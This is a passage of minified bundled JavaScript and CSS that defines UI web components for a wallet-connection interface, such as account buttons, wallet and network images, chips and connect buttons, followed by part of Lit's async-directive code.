`;var zc=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Qo=class extends $e{constructor(){super(...arguments),this.size="md",this.backgroundColor="accent-100",this.iconColor="accent-100",this.background="transparent",this.border=!1,this.borderColor="wui-color-bg-125",this.icon="copy"}render(){let e="xxs";switch(this.size){case"lg":e="lg";break;case"md":e="md";break;case"mdl":e="mdl";break;case"sm":e="xs";break;default:e="xxs"}const t="lg"===this.size,r=t?"12%":"16%",n=t?"xxs":"3xl",i="opaque"===this.background,o="accent-100"===this.backgroundColor&&i||"success-100"===this.backgroundColor&&i||"error-100"===this.backgroundColor&&i||"inverse-100"===this.backgroundColor&&i;return this.style.cssText=`\n       --local-bg-value: ${o?`var(--wui-icon-box-bg-${this.backgroundColor})`:`var(--wui-color-${this.backgroundColor})`};\n       --local-bg-mix: ${o?"100%":r};\n       --local-border-radius: var(--wui-border-radius-${n});\n       --local-size: var(--wui-icon-box-size-${this.size});\n       --local-border: ${"wui-color-bg-125"===this.borderColor?"2px":"1px"} solid ${this.border?`var(--${this.borderColor})`:"transparent"}\n   `,pe` <wui-icon color=${this.iconColor} size=${e} name=${this.icon}></wui-icon> `}};Qo.styles=[Rt,dn,Ej],zc([ve()],Qo.prototype,"size",void 0),zc([ve()],Qo.prototype,"backgroundColor",void 0),zc([ve()],Qo.prototype,"iconColor",void 0),zc([ve()],Qo.prototype,"background",void 0),zc([ve({type:Boolean})],Qo.prototype,"border",void 0),zc([ve()],Qo.prototype,"borderColor",void 0),zc([ve()],Qo.prototype,"icon",void 0),Qo=zc([De("wui-icon-box")],Qo);const xj=Qe`
  :host {
    display: block;
  }

  button {
    border-radius: var(--wui-border-radius-3xl);
    background: var(--wui-gray-glass-002);
    display: flex;
    gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-3xs) var(--wui-spacing-xs) var(--wui-spacing-3xs)
      var(--wui-spacing-xs);
    border: 1px solid var(--wui-gray-glass-005);
  }

  button:disabled {
    background: var(--wui-gray-glass-015);
  }

  button:disabled > wui-text {
    color: var(--wui-gray-glass-015);
  }

  button:disabled > wui-flex > wui-text {
    color: var(--wui-gray-glass-015);
  }

  button:disabled > wui-image,
  button:disabled > wui-icon-box,
  button:disabled > wui-flex > wui-avatar {
    filter: grayscale(1);
  }

  button:has(wui-image) {
    padding: var(--wui-spacing-3xs) var(--wui-spacing-3xs) var(--wui-spacing-3xs)
      var(--wui-spacing-xs);
  }

  wui-text {
    color: var(--wui-color-fg-100);
  }

  wui-flex > wui-text {
    color: var(--wui-color-fg-200);
    transition: all var(--wui-ease-out-power-1) var(--wui-duration-lg);
  }

  wui-image,
  wui-icon-box {
    border-radius: var(--wui-border-radius-3xl);
    width: 24px;
    height: 24px;
    outline: 2px solid var(--wui-gray-glass-005);
  }

  wui-flex {
    border-radius: var(--wui-border-radius-3xl);
    border: 1px solid var(--wui-gray-glass-005);
    background: var(--wui-gray-glass-005);
    padding: 4px var(--wui-spacing-m) 4px var(--wui-spacing-xxs);
  }

  wui-flex.local-no-balance {
    border-radius: 0px;
    border: none;
    background: transparent;
  }

  wui-avatar {
    width: 20px;
    height: 20px;
    outline: 2px solid var(--wui-gray-glass-010);
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled > wui-flex > wui-text {
      color: var(--wui-color-fg-175);
    }

    button:active:enabled > wui-flex > wui-text {
      color: var(--wui-color-fg-175);
    }
  }
`;var ru=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Ba=class extends $e{constructor(){super(...arguments),this.networkSrc=void 0,this.avatarSrc=void 0,this.balance=void 0,this.disabled=!1,this.isProfileName=!1,this.address=""}render(){return pe`
      <button ?disabled=${this.disabled}>
        ${this.balanceTemplate()}
        <wui-flex
          gap="xxs"
          alignItems="center"
          class=${qt(this.balance?void 0:"local-no-balance")}
        >
          <wui-avatar
            .imageSrc=${this.avatarSrc}
            alt=${this.address}
            address=${this.address}
          ></wui-avatar>
          <wui-text variant="paragraph-600" color="inherit">
            ${Mr.getTruncateString({string:this.address,charsStart:this.isProfileName?18:4,charsEnd:this.isProfileName?0:6,truncate:this.isProfileName?"end":"middle"})}
          </wui-text>
        </wui-flex>
      </button>
    `}balanceTemplate(){if(this.balance){const e=this.networkSrc?pe`<wui-image src=${this.networkSrc}></wui-image>`:pe`
            <wui-icon-box
              size="sm"
              iconColor="fg-200"
              backgroundColor="fg-300"
              icon="networkPlaceholder"
            ></wui-icon-box>
          `;return pe`
        ${e}
        <wui-text variant="paragraph-600" color="inherit"> ${this.balance} </wui-text>
      `}return null}};Ba.styles=[Rt,dn,xj],ru([ve()],Ba.prototype,"networkSrc",void 0),ru([ve()],Ba.prototype,"avatarSrc",void 0),ru([ve()],Ba.prototype,"balance",void 0),ru([ve({type:Boolean})],Ba.prototype,"disabled",void 0),ru([ve({type:Boolean})],Ba.prototype,"isProfileName",void 0),ru([ve()],Ba.prototype,"address",void 0),Ba=ru([De("wui-account-button")],Ba);const Sj=Qe`
  :host {
    position: relative;
    border-radius: inherit;
    overflow: hidden;
    background-color: var(--wui-gray-glass-002);
    display: flex;
    justify-content: center;
    align-items: center;
    width: var(--local-size);
    height: var(--local-size);
    border-radius: var(--local-border-radius);
  }

  :host::after {
    content: '';
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    border-radius: inherit;
    border: 1px solid var(--wui-gray-glass-010);
    pointer-events: none;
  }

  :host([name='Extension'])::after {
    border: 1px solid var(--wui-accent-glass-010);
  }

  :host([data-wallet-icon='allWallets']) {
    background-color: var(--wui-all-wallets-bg-100);
  }

  :host([data-wallet-icon='allWallets'])::after {
    border: 1px solid var(--wui-accent-glass-010);
  }

  wui-icon[data-parent-size='inherit'] {
    width: 75%;
    height: 75%;
    align-items: center;
  }

  wui-icon[data-parent-size='sm'] {
    width: 18px;
    height: 18px;
  }

  wui-icon[data-parent-size='md'] {
    width: 24px;
    height: 24px;
  }

  wui-icon[data-parent-size='lg'] {
    width: 42px;
    height: 42px;
  }

  wui-icon[data-parent-size='full'] {
    width: 100%;
    height: 100%;
  }
`;var _0=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let jl=class extends $e{constructor(){super(...arguments),this.size="md",this.name=""}render(){let e="xxs";return e="lg"===this.size?"m":"md"===this.size?"xs":"xxs",this.style.cssText=`\n       --local-border-radius: var(--wui-border-radius-${e});\n       --local-size: var(--wui-wallet-image-size-${this.size});\n   `,this.walletIcon&&(this.dataset.walletIcon=this.walletIcon),pe` ${this.templateVisual()}`}templateVisual(){return this.imageSrc?pe`<wui-image src=${this.imageSrc} alt=${this.name}></wui-image>`:this.walletIcon?pe`<wui-icon
        data-parent-size="md"
        size="md"
        color="inherit"
        name=${this.walletIcon}
      ></wui-icon>`:pe`<wui-icon
      data-parent-size=${this.size}
      size="inherit"
      color="inherit"
      name="walletPlaceholder"
    ></wui-icon>`}};jl.styles=[Rt,Sj],_0([ve()],jl.prototype,"size",void 0),_0([ve()],jl.prototype,"name",void 0),_0([ve()],jl.prototype,"imageSrc",void 0),_0([ve()],jl.prototype,"walletIcon",void 0),jl=_0([De("wui-wallet-image")],jl);const Cj=Qe`
  :host {
    position: relative;
    border-radius: var(--wui-border-radius-xxs);
    width: 40px;
    height: 40px;
    overflow: hidden;
    background: var(--wui-gray-glass-002);
    display: flex;
    justify-content: center;
    align-items: center;
    flex-wrap: wrap;
    gap: var(--wui-spacing-4xs);
    padding: 3.75px !important;
  }

  :host::after {
    content: '';
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    border-radius: inherit;
    border: 1px solid var(--wui-gray-glass-010);
    pointer-events: none;
  }

  :host > wui-wallet-image {
    width: 14px;
    height: 14px;
    border-radius: var(--wui-border-radius-5xs);
  }
`;var $A=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};const dw=4;let mg=class extends $e{constructor(){super(...arguments),this.walletImages=[]}render(){const e=this.walletImages.length<4;return pe`${this.walletImages.slice(0,4).map((({src:e,walletName:t})=>pe`
          <wui-wallet-image
            size="inherit"
            imageSrc=${e}
            name=${qt(t)}
          ></wui-wallet-image>
        `))}
    ${e?[...Array(4-this.walletImages.length)].map((()=>pe` <wui-wallet-image size="inherit" name=""></wui-wallet-image>`)):null}`}};mg.styles=[Rt,Cj],$A([ve({type:Array})],mg.prototype,"walletImages",void 0),mg=$A([De("wui-all-wallets-image")],mg);const Aj=Qe`
  :host {
    width: var(--local-width);
    position: relative;
  }

  button {
    border: 1px solid var(--wui-gray-glass-010);
    border-radius: var(--wui-border-radius-m);
    width: var(--local-width);
  }

  button:disabled {
    border: 1px solid var(--wui-gray-glass-010);
  }

  button[data-size='sm'] {
    padding: 6px 12px;
  }

  ::slotted(*) {
    transition: opacity 200ms ease-in-out;
    opacity: var(--local-opacity-100);
  }

  button > wui-text {
    transition: opacity 200ms ease-in-out;
    opacity: var(--local-opacity-100);
  }

  button[data-size='md'] {
    padding: 9px var(--wui-spacing-l) 9px var(--wui-spacing-l);
  }

  wui-loading-spinner {
    position: absolute;
    left: 50%;
    top: 50%;
    transition: all 200ms ease-in-out;
    transform: translate(-50%, -50%);
    opacity: var(--local-opacity-000);
  }
`;var th=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Tc=class extends $e{constructor(){super(...arguments),this.size="md",this.disabled=!1,this.fullWidth=!1,this.loading=!1,this.variant="fill"}render(){this.style.cssText=`\n    --local-width: ${this.fullWidth?"100%":"auto"};\n    --local-opacity-100: ${this.loading?0:1};\n    --local-opacity-000: ${this.loading?1:0};`;const e="md"===this.size?"paragraph-600":"small-600";return pe`
      <button
        data-variant=${this.variant}
        data-size=${this.size}
        ?disabled=${this.disabled||this.loading}
        ontouchstart
      >
        ${this.loadingTemplate()}
        <slot name="iconLeft"></slot>
        <wui-text variant=${e} color="inherit">
          <slot></slot>
        </wui-text>
        <slot name="iconRight"></slot>
      </button>
    `}loadingTemplate(){return this.loading?pe`<wui-loading-spinner color="fg-300"></wui-loading-spinner>`:pe``}};Tc.styles=[Rt,dn,Aj],th([ve()],Tc.prototype,"size",void 0),th([ve({type:Boolean})],Tc.prototype,"disabled",void 0),th([ve({type:Boolean})],Tc.prototype,"fullWidth",void 0),th([ve({type:Boolean})],Tc.prototype,"loading",void 0),th([ve()],Tc.prototype,"variant",void 0),Tc=th([De("wui-button")],Tc);const LA=ze`<svg  viewBox="0 0 48 54" fill="none">
  <path
    d="M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z"
  />
</svg>`,Ij=Qe`
  :host {
    display: flex;
    flex-direction: column;
    align-items: center;
    width: 76px;
    row-gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-xs) 10px;
    background-color: var(--wui-gray-glass-002);
    border-radius: clamp(0px, var(--wui-border-radius-xs), 20px);
    position: relative;
  }

  wui-shimmer[data-type='network'] {
    border: none;
    -webkit-clip-path: var(--wui-path-network);
    clip-path: var(--wui-path-network);
  }

  svg {
    position: absolute;
    width: 48px;
    height: 54px;
    z-index: 1;
  }

  svg > path {
    stroke: var(--wui-gray-glass-010);
    stroke-width: 1px;
  }
`;var BA=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let bg=class extends $e{constructor(){super(...arguments),this.type="wallet"}render(){return pe`
      ${this.shimmerTemplate()}
      <wui-shimmer width="56px" height="20px" borderRadius="xs"></wui-shimmer>
    `}shimmerTemplate(){return"network"===this.type?pe` <wui-shimmer
          data-type=${this.type}
          width="48px"
          height="54px"
          borderRadius="xs"
        ></wui-shimmer>
        ${LA}`:pe`<wui-shimmer width="56px" height="56px" borderRadius="xs"></wui-shimmer>`}};bg.styles=[Rt,dn,Ij],BA([ve()],bg.prototype,"type",void 0),bg=BA([De("wui-card-select-loader")],bg);const Rj=ze`<svg width="86" height="96" fill="none">
  <path
    d="M78.3244 18.926L50.1808 2.45078C45.7376 -0.150261 40.2624 -0.150262 35.8192 2.45078L7.6756 18.926C3.23322 21.5266 0.5 26.3301 0.5 31.5248V64.4752C0.5 69.6699 3.23322 74.4734 7.6756 77.074L35.8192 93.5492C40.2624 96.1503 45.7376 96.1503 50.1808 93.5492L78.3244 77.074C82.7668 74.4734 85.5 69.6699 85.5 64.4752V31.5248C85.5 26.3301 82.7668 21.5266 78.3244 18.926Z"
  />
</svg>`,Tj=Qe`
  :host {
    position: relative;
    border-radius: inherit;
    display: flex;
    justify-content: center;
    align-items: center;
    width: var(--local-width);
    height: var(--local-height);
  }

  svg {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
    fill: var(--wui-gray-glass-002);
  }

  svg > path {
    stroke: var(--local-stroke);
    transition: stroke var(--wui-ease-out-power-1) var(--wui-duration-lg);
  }

  wui-image {
    width: 100%;
    height: 100%;
    -webkit-clip-path: var(--local-path);
    clip-path: var(--local-path);
    background: var(--wui-gray-glass-002);
  }

  wui-icon {
    transform: translateY(-5%);
    width: var(--local-icon-size);
    height: var(--local-icon-size);
  }
`;var E0=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Ul=class extends $e{constructor(){super(...arguments),this.size="md",this.name="uknown",this.selected=!1}render(){const e="lg"===this.size;return this.style.cssText=`\n      --local-stroke: ${this.selected?"var(--wui-color-accent-100)":"var(--wui-gray-glass-010)"};\n      --local-path: ${e?"var(--wui-path-network-lg)":"var(--wui-path-network)"};\n      --local-width: ${e?"86px":"48px"};\n      --local-height: ${e?"96px":"54px"};\n      --local-icon-size: ${e?"42px":"24px"};\n    `,pe`${this.templateVisual()} ${e?Rj:LA}`}templateVisual(){return this.imageSrc?pe`<wui-image src=${this.imageSrc} alt=${this.name}></wui-image>`:pe`<wui-icon size="inherit" color="fg-200" name="networkPlaceholder"></wui-icon>`}};Ul.styles=[Rt,Tj],E0([ve()],Ul.prototype,"size",void 0),E0([ve()],Ul.prototype,"name",void 0),E0([ve()],Ul.prototype,"imageSrc",void 0),E0([ve({type:Boolean})],Ul.prototype,"selected",void 0),Ul=E0([De("wui-network-image")],Ul);const Nj=Qe`
  button {
    flex-direction: column;
    width: 76px;
    row-gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-xs) var(--wui-spacing-0);
    background-color: var(--wui-gray-glass-002);
    border-radius: clamp(0px, var(--wui-border-radius-xs), 20px);
  }

  button > wui-text {
    color: var(--wui-color-fg-100);
    max-width: 64px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    justify-content: center;
  }

  button:disabled > wui-text {
    color: var(--wui-gray-glass-015);
  }

  [data-selected='true'] {
    background-color: var(--wui-accent-glass-020);
  }

  @media (hover: hover) and (pointer: fine) {
    [data-selected='true']:hover:enabled {
      background-color: var(--wui-accent-glass-015);
    }
  }

  [data-selected='true']:active:enabled {
    background-color: var(--wui-accent-glass-010);
  }
`;var rh=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Nc=class extends $e{constructor(){super(...arguments),this.name="Unknown",this.type="wallet",this.imageSrc=void 0,this.disabled=!1,this.selected=!1}render(){return pe`
      <button data-selected=${qt(this.selected)} ?disabled=${this.disabled} ontouchstart>
        ${this.imageTemplate()}
        <wui-text variant="tiny-500" color=${this.selected?"accent-100":"inherit"}>
          ${this.name}
        </wui-text>
      </button>
    `}imageTemplate(){return"network"===this.type?pe`
        <wui-network-image
          .selected=${this.selected}
          imageSrc=${qt(this.imageSrc)}
          name=${this.name}
        >
        </wui-network-image>
      `:pe`
      <wui-wallet-image size="md" imageSrc=${qt(this.imageSrc)} name=${this.name}>
      </wui-wallet-image>
    `}};Nc.styles=[Rt,dn,Nj],rh([ve()],Nc.prototype,"name",void 0),rh([ve()],Nc.prototype,"type",void 0),rh([ve()],Nc.prototype,"imageSrc",void 0),rh([ve({type:Boolean})],Nc.prototype,"disabled",void 0),rh([ve({type:Boolean})],Nc.prototype,"selected",void 0),Nc=rh([De("wui-card-select")],Nc);const Oj=Qe`
  a {
    border: 1px solid var(--wui-gray-glass-010);
    border-radius: var(--wui-border-radius-3xl);
  }

  wui-image {
    border-radius: var(--wui-border-radius-3xl);
    overflow: hidden;
  }

  a.disabled > wui-icon,
  a.disabled > wui-image {
    filter: grayscale(1);
  }

  a[data-variant='fill'] {
    color: var(--wui-color-inverse-100);
    background-color: var(--wui-color-accent-100);
  }

  a[data-variant='shade'] {
    background-color: transparent;
    background-color: var(--wui-gray-glass-010);
    color: var(--wui-color-fg-200);
  }

  a[data-variant='transparent'] {
    column-gap: var(--wui-spacing-xxs);
    background-color: transparent;
    padding: 7px var(--wui-spacing-s) 7px 10px;
    color: var(--wui-color-fg-150);
  }

  a[data-variant='transparent']:has(wui-text:first-child) {
    padding: 7px var(--wui-spacing-s);
  }

  a[data-variant='fill'],
  a[data-variant='shade'] {
    column-gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-xxs) var(--wui-spacing-m) var(--wui-spacing-xxs)
      var(--wui-spacing-xs);
  }

  a[data-variant='fill']:has(wui-text:first-child),
  a[data-variant='shade']:has(wui-text:first-child) {
    padding: 8.5px var(--wui-spacing-m) 9.5px var(--wui-spacing-m);
  }

  a[data-variant='fill'] > wui-image,
  a[data-variant='shade'] > wui-image {
    width: 24px;
    height: 24px;
  }

  a[data-variant='fill'] > wui-image {
    border: 1px solid var(--wui-color-accent-090);
  }

  a[data-variant='shade'] > wui-image {
    border: 1px solid var(--wui-gray-glass-010);
  }

  a[data-variant='fill'] > wui-icon,
  a[data-variant='shade'] > wui-icon {
    width: 14px;
    height: 14px;
  }

  a[data-variant='transparent'] > wui-image {
    width: 14px;
    height: 14px;
  }

  a[data-variant='transparent'] > wui-icon {
    width: 12px;
    height: 12px;
  }

  a[data-variant='fill']:focus-visible {
    background-color: var(--wui-color-accent-090);
  }

  a[data-variant='shade']:focus-visible {
    background-color: var(--wui-gray-glass-015);
  }

  a[data-variant='transparent']:focus-visible {
    background-color: var(--wui-gray-glass-005);
  }

  a.disabled {
    color: var(--wui-gray-glass-015);
    background-color: var(--wui-gray-glass-015);
    pointer-events: none;
  }

  @media (hover: hover) and (pointer: fine) {
    a[data-variant='fill']:hover {
      background-color: var(--wui-color-accent-090);
    }

    a[data-variant='shade']:hover {
      background-color: var(--wui-gray-glass-015);
    }

    a[data-variant='transparent']:hover {
      background-color: var(--wui-gray-glass-005);
    }
  }

  a[data-variant='fill']:active {
    background-color: var(--wui-color-accent-080);
  }

  a[data-variant='shade']:active {
    background-color: var(--wui-gray-glass-020);
  }

  a[data-variant='transparent']:active {
    background-color: var(--wui-gray-glass-010);
  }
`;var nh=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Oc=class extends $e{constructor(){super(...arguments),this.variant="fill",this.imageSrc=void 0,this.disabled=!1,this.icon="externalLink",this.href=""}render(){const e="transparent"===this.variant?"small-600":"paragraph-600";return pe`
      <a
        rel="noreferrer"
        target="_blank"
        href=${this.href}
        class=${this.disabled?"disabled":""}
        data-variant=${this.variant}
      >
        ${this.imageTemplate()}
        <wui-text variant=${e} color="inherit">
          ${Mr.getHostName(this.href)}
        </wui-text>
        <wui-icon name=${this.icon} color="inherit" size="inherit"></wui-icon>
      </a>
    `}imageTemplate(){return this.imageSrc?pe`<wui-image src=${this.imageSrc}></wui-image>`:null}};Oc.styles=[Rt,dn,Oj],nh([ve()],Oc.prototype,"variant",void 0),nh([ve()],Oc.prototype,"imageSrc",void 0),nh([ve({type:Boolean})],Oc.prototype,"disabled",void 0),nh([ve()],Oc.prototype,"icon",void 0),nh([ve()],Oc.prototype,"href",void 0),Oc=nh([De("wui-chip")],Oc);const Pj=Qe`
  :host {
    position: relative;
    display: block;
  }

  button {
    background: var(--wui-color-accent-100);
    border: 1px solid var(--wui-gray-glass-010);
    border-radius: var(--wui-border-radius-m);
    gap: var(--wui-spacing-xs);
  }

  button.loading {
    background: var(--wui-gray-glass-010);
    border: 1px solid var(--wui-gray-glass-010);
    pointer-events: none;
  }

  button:disabled {
    background-color: var(--wui-gray-glass-015);
    border: 1px solid var(--wui-gray-glass-010);
  }

  button:disabled > wui-text {
    color: var(--wui-gray-glass-015);
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled {
      background-color: var(--wui-color-accent-090);
    }

    button:active:enabled {
      background-color: var(--wui-color-accent-080);
    }
  }

  button:focus-visible {
    border: 1px solid var(--wui-gray-glass-010);
    background-color: var(--wui-color-accent-090);
    -webkit-box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
    -moz-box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
    box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
  }

  button[data-size='sm'] {
    padding: 6.75px 10px 7.25px;
  }

  ::slotted(*) {
    transition: opacity 200ms ease-in-out;
    opacity: var(--local-opacity-100);
  }

  button > wui-text {
    transition: opacity 200ms ease-in-out;
    opacity: var(--local-opacity-100);
    color: var(--wui-color-inverse-100);
  }

  button[data-size='md'] {
    padding: 9px var(--wui-spacing-l) 9px var(--wui-spacing-l);
  }

  button[data-size='md'] + wui-text {
    padding-left: var(--wui-spacing-3xs);
  }

  wui-loading-spinner {
    width: 14px;
    height: 14px;
  }

  wui-loading-spinner::slotted(svg) {
    width: 10px !important;
    height: 10px !important;
  }

  button[data-size='sm'] > wui-loading-spinner {
    width: 12px;
    height: 12px;
  }
`;var I3=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Zd=class extends $e{constructor(){super(...arguments),this.size="md",this.loading=!1}render(){const e="md"===this.size?"paragraph-600":"small-600";return pe`
      <button data-size=${this.size} ?disabled=${this.loading} ontouchstart>
        ${this.loadingTemplate()}
        <wui-text variant=${e} color=${this.loading?"accent-100":"inherit"}>
          <slot></slot>
        </wui-text>
      </button>
    `}loadingTemplate(){return this.loading?pe`<wui-loading-spinner size=${this.size} color="accent-100"></wui-loading-spinner>`:null}};Zd.styles=[Rt,dn,Pj],I3([ve()],Zd.prototype,"size",void 0),I3([ve({type:Boolean})],Zd.prototype,"loading",void 0),Zd=I3([De("wui-connect-button")],Zd);const Mj=Qe`
  wui-flex {
    width: 100%;
    background-color: var(--wui-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
  }
`;var mv=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Af=class extends $e{constructor(){super(...arguments),this.disabled=!1,this.label="",this.buttonLabel=""}render(){return pe`
      <wui-flex
        justifyContent="space-between"
        alignItems="center"
        .padding=${["1xs","2l","1xs","2l"]}
      >
        <wui-text variant="paragraph-500" colo="fg-200">${this.label}</wui-text>
        <wui-button size="sm" variant="accent">
          ${this.buttonLabel}
          <wui-icon size="sm" color="inherit" slot="iconRight" name="chevronRight"></wui-icon>
        </wui-button>
      </wui-flex>
    `}};Af.styles=[Rt,dn,Mj],mv([ve({type:Boolean})],Af.prototype,"disabled",void 0),mv([ve()],Af.prototype,"label",void 0),mv([ve()],Af.prototype,"buttonLabel",void 0),Af=mv([De("wui-cta-button")],Af);
/**
 * @license
 * Copyright 2020 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */
const kj=e=>void 0===e.strings
/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */,Td=(e,t)=>{var r;const n=e._$AN;if(void 0===n)return!1;for(const e of n)null==(r=e._$AO)||r.call(e,t,!1),Td(e,t);return!0},wg=e=>{let t,r;do{if(void 0===(t=e._$AM))break;r=t._$AN,r.delete(e),e=t}while(0===(null==r?void 0:r.size))},FA=e=>{for(let t;t=e._$AM;e=t){let r=t._$AN;if(void 0===r)t._$AN=r=new Set;else if(r.has(e))break;r.add(e),Lj(t)}};function Dj(e){void 0!==this._$AN?(wg(this),this._$AM=e,FA(this)):this._$AM=e}function $j(e,t=!1,r=0){const n=this._$AH,i=this._$AN;if(void 0!==i&&0!==i.size)if(t)if(Array.isArray(n))for(let e=r;e<n.length;e++)Td(n[e],!1),wg(n[e]);else null!=n&&(Td(n,!1),wg(n));else Td(this,e)}const Lj=e=>{e.type==PA.CHILD&&(e._$AP??(e._$AP=$j),e._$AQ??(e._$AQ=Dj))};let Bj=class extends kA{constructor(){super(...arguments),this._$AN=void 0}_$AT(e,t,r){super._$AT(e,t,r),FA(this),this.isConnected=e._$AU}_$AO(e,t=!0){var r,n;e!==this.isConnected&&(this.isConnected=e,e?null==(r=this.reconnected)||r.call(this):null==(n=this.disconnected)||n.call(this)),t&&(Td(this,e),wg(this))}setValue(e){if(kj(this._$Ct))this._$Ct._$AI(e,this);else{const t=[...this._$Ct._$AH];t[this._$Ci]=e,this._$Ct._$AI(t,this,0)}}disconnected(){}reconnected(){}};
/**
 * @license
 * Copyright 2020 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
